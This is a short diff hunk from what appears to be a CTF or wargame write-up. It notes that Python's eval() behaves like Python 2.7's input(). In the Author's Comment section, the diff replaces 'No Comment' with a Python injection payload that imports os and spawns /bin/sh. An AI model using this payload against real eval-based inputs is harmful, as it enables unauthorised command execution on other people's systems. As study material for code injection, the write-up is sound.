@@ -24,6 +24,6 @@ python `eval()` == python 2.7 `input()`
 
 ## Author's Comment
 
-* No Comment
+* __import__('os').system('/bin/sh')
 
 ## ETC
